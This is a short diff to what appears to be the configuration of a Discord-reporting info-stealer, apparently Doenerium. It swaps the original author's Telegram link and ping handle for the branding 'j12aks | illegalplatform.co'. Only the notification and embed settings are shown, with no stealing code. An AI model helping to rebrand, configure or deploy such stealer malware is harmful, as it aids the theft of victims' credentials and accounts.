@@ -20,7 +20,7 @@ var config = {
 
    notify_on_logout: false,
    notify_on_initialization: false,
-   ping: [false, "@ataput"],
+   ping: [false, "@J12aKs"],
 
    embed: {
        username: "j12aks | illegalplatform.co",
@@ -28,7 +28,7 @@ var config = {
            text: `illegalplatform.co`,
            icon_url: "https://cdn.discordapp.com/attachments/883814053737295982/1091784907774251131/MV5BMzczNDA1MjgwN15BMl5BanBnXkFtZTcwODc5NzI1OQ._V1_UY1200_CR58506301200_AL_.jpg",
        },
-       href: "https://t.me/doenerium",
+       href: "j12aks | illegalplatform.co",
        avatar_url: "https://cdn.discordapp.com/attachments/883814053737295982/1091784907774251131/MV5BMzczNDA1MjgwN15BMl5BanBnXkFtZTcwODc5NzI1OQ._V1_UY1200_CR58506301200_AL_.jpg"
    },
 
